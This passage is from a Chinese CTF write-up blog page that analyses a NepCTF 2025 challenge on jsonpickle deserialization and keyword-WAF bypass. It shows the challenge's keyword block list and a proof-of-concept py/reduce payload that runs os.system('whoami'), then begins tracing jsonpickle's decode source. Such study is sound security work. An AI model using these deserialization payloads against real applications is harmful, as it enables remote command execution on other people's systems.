@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析 - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析"><meta name="keywords" content='Unserialize'>
+  <meta itemprop="name" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析">
+  <meta itemprop="description" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析">
+  <meta itemprop="datePublished" content="2025-08-08T17:10:19+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:00+08:00">
+  <meta itemprop="wordCount" content="1254">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Unserialize"><meta property="og:url" content="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析">
+  <meta property="og:description" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-08T17:10:19+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:00+08:00">
+    <meta property="article:tag" content="Unserialize">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析" /><meta name="twitter:description" content="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" title="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析 - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" title="第十届 “磐石行动” 初赛 2025 Web Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/%E5%AE%81%E6%B3%A2%E8%B5%9B-2025-web-writeup/" title="天一永安杯 2025 Web Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/index.md" title="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析 - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Unserialize","wordcount":  1254 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90\/","datePublished": "2025-08-08T17:10:19+00:00","dateModified": "2026-07-09T18:34:00+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-08T17:10:19Z">8 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#jsonpickle">JsonPIckle</a>
+      <ul>
+        <li><a href="#反序列化流程分析">反序列化流程分析</a></li>
+        <li><a href="#标签解析">标签解析</a>
+          <ul>
+            <li><a href="#pyobject-标签"><code>py/object</code> 标签</a></li>
+            <li><a href="#pysetpytuple-标签"><code>py/set、py/tuple</code> 标签</a></li>
+            <li><a href="#pytype-标签"><code>py/type</code> 标签</a></li>
+          </ul>
+        </li>
+        <li><a href="#waf-绕过">WAF 绕过</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>前段时间 NepCTF 2025 一道 Web 题中考察了 JsonPickle 反序列化及 WAF 绕过的技巧
+关键代码段如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">FORBIDDEN = [&#39;builtins&#39;, &#39;os&#39;, &#39;system&#39;, &#39;repr&#39;, &#39;__class__&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;Popen&#39;, &#39;nt&#39;,&#39;code&#39;, &#39;reduce&#39;, &#39;compile&#39;, &#39;command&#39;, &#39;pty&#39;, &#39;platform&#39;, &#39;pdb&#39;, &#39;pickle&#39;, &#39;marshal&#39;,&#39;socket&#39;, &#39;threading&#39;, &#39;multiprocessing&#39;, &#39;signal&#39;, &#39;traceback&#39;, &#39;inspect&#39;, &#39;\\\\\\\\&#39;, &#39;posix&#39;,&#39;render_template&#39;, &#39;jsonpickle&#39;, &#39;cgi&#39;, &#39;execfile&#39;, &#39;importlib&#39;, &#39;sys&#39;, &#39;shutil&#39;, &#39;state&#39;,&#39;import&#39;, &#39;ctypes&#39;, &#39;timeit&#39;, &#39;input&#39;, &#39;open&#39;, &#39;codecs&#39;, &#39;base64&#39;, &#39;jinja2&#39;, &#39;re&#39;, &#39;json&#39;,&#39;file&#39;, &#39;write&#39;, &#39;read&#39;, &#39;globals&#39;, &#39;locals&#39;, &#39;getattr&#39;, &#39;setattr&#39;, &#39;delattr&#39;, &#39;uuid&#39;,&#39;__import__&#39;, &#39;__globals__&#39;, &#39;__code__&#39;, &#39;__closure__&#39;, &#39;__func__&#39;, &#39;__self__&#39;, &#39;pydoc&#39;,&#39;__module__&#39;, &#39;__dict__&#39;, &#39;__mro__&#39;, &#39;__subclasses__&#39;, &#39;__init__&#39;, &#39;__new__&#39;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def waf(serialized):
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        data = json.loads(serialized)
+</span></span><span class="line"><span class="cl">        payload = json.dumps(data, ensure_ascii=False)
+</span></span><span class="line"><span class="cl">        for bad in FORBIDDEN:
+</span></span><span class="line"><span class="cl">            if bad in payload:
+</span></span><span class="line"><span class="cl">                return bad
+</span></span><span class="line"><span class="cl">        return None
+</span></span><span class="line"><span class="cl">    except:
+</span></span><span class="line"><span class="cl">        return &#34;error&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/panel&#39;)
+</span></span><span class="line"><span class="cl">def panel():
+</span></span><span class="line"><span class="cl">    token = request.cookies.get(&#34;authz&#34;)
+</span></span><span class="line"><span class="cl">	...
+</span></span><span class="line"><span class="cl">    ban = waf(decoded)
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        sess_obj = jsonpickle.decode(decoded, safe=True)
+</span></span><span class="line"><span class="cl">        ...
+</span></span><span class="line"><span class="cl">        return render_template(&#39;admin_panel.html&#39;)
+</span></span><span class="line"><span class="cl">    except Exception as e:
+</span></span><span class="line"><span class="cl">        return render_template(&#39;error.html&#39;, error=&#34;数据解码失败。&#34;)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>过滤了很多关键字，为了绕过，接下来深入探讨 jsonpickle 反序列化机制。</p>
+<h1 class="heading-element" id="jsonpickle"><span>JsonPIckle</span>
+  <a href="#jsonpickle" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><code>jsonpickle</code> 是一个 Python 库，用于将复杂的 Python 对象序列化到 JSON 或从 JSON 反序列化。用于将 Python 编码为 JSON 的标准 Python 库，例如 stdlib 的 json 和 simplejson 只能处理具有直接 JSON 等效项的 Python 原语（例如 dicts、lists、strings、ints 等）。
+jsonpickle 建立在这些库之上，并允许将更复杂的数据结构序列化为 JSON。其是高度可配置和可扩展的——允许用户选择 JSON 后端并添加其他后端。</p>
+<p>在官方文档中开头就明确警告标明，jsonpickle 模块并不安全 (:笑
+<figure>
+  <img src="file-20250807181259100.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="反序列化流程分析"><span>反序列化流程分析</span>
+  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>jsonpickle 库中提供了用于将 JSON 字符串转换为 Python 对象的方法 jsonpickle.decode()。下面我写了一段 demo，用于调试代码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jsonpickle</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Person</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,))</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">Person</span><span class="p">(</span><span class="s2">&#34;Alice&#34;</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Person: &#34;</span><span class="p">,</span> <span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">Evil</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Evil: &#34;</span><span class="p">,</span> <span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Person:  {&#34;py/object&#34;: &#34;__main__.Person&#34;, &#34;name&#34;: &#34;Alice&#34;, &#34;age&#34;: 30}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Evil:  {&#34;py/reduce&#34;: [{&#34;py/function&#34;: &#34;nt.system&#34;}, {&#34;py/tuple&#34;: [&#34;whoami&#34;]}]}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>已知 jsonpickle.decode 会反序列化 JSON 字符串，也就是当反序列化 Evil 实例化对象序列化后的字符串时，会触发 <code>__reduce__()</code> 魔术方法去命令执行，那么假如将 evil 插入到 person 中呢？反序列化是对整段字符串都进行，且肯定是有写遍历的，我认为这样同样也是可以被正常触发的</p>
+<json-viewer value="&#34;{\&#34;py/object\&#34;: \&#34;__main__.Person\&#34;, \&#34;name\&#34;: {\&#34;py/reduce\&#34;: [{\&#34;py/function\&#34;: \&#34;nt.system\&#34;}, {\&#34;py/tuple\&#34;: [\&#34;whoami\&#34;]}]}, \&#34;age\&#34;: 30}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>接下来调试程序，看看反序列化的流程
+程序刚进去，是进了 site-packages\jsonpickle\unpickler.py::decode() 方法内
+<figure>
+  <img src="file-20250807182833268.png" alt="" loading="lazy"></figure>
+
+看一下这个方法，前面主要在获取和处理传入的参数，如果我们传入的本身就是标准的 JSON，那么就不会有影响</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果 on_missing 是字符串，则转为小写</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">on_missing</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">on_missing</span> <span class="o">=</span> <span class="n">on_missing</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 否则如果不是函数类型，发出警告</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="ow">not</span> <span class="n">util</span><span class="o">.</span><span class="n">is_function</span><span class="p">(</span><span class="n">on_missing</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">warnings</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Unpickler.on_missing must be a string or a function! It will be ignored!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果 backend 为空则默认使用 json 库</span>
+</span></span><span class="line"><span class="cl">    <span class="n">backend</span> <span class="o">=</span> <span class="n">backend</span> <span class="ow">or</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果 context 未提供，则初始化一个 Unpickler 上下文</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span> <span class="o">=</span> <span class="n">context</span> <span class="ow">or</span> <span class="n">Unpickler</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">keys</span><span class="o">=</span><span class="n">keys</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">backend</span><span class="o">=</span><span class="n">backend</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">safe</span><span class="o">=</span><span class="n">safe</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v1_decode</span><span class="o">=</span><span class="n">v1_decode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">on_missing</span><span class="o">=</span><span class="n">on_missing</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 使用 backend 解码传入的 JSON 字符串为原始数据对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">backend</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		  <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">			    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">			    从 JSON 字符串中尝试解码对象。
+</span></span></span><span class="line"><span class="cl"><span class="s2">			    会按顺序尝试多个后端解析器，直到成功或抛出最后一个异常。
+</span></span></span><span class="line"><span class="cl"><span class="s2">			    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">			    <span class="bp">self</span><span class="o">.</span><span class="n">_verify</span><span class="p">()</span>  <span class="c1"># 校验 backend 配置是否正常</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			    <span class="c1"># 如果不允许多 backend fallback，直接用首选 backend 解码</span>
+</span></span><span class="line"><span class="cl">			    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_fallthrough</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			        <span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_backend_names</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">			        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">backend_decode</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			    <span class="c1"># 否则尝试每一个注册的 backend，直到成功或最后一个失败</span>
+</span></span><span class="line"><span class="cl">			    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_backend_names</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">			        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">backend_decode</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			        <span class="k">except</span> <span class="bp">self</span><span class="o">.</span><span class="n">_decoder_exceptions</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
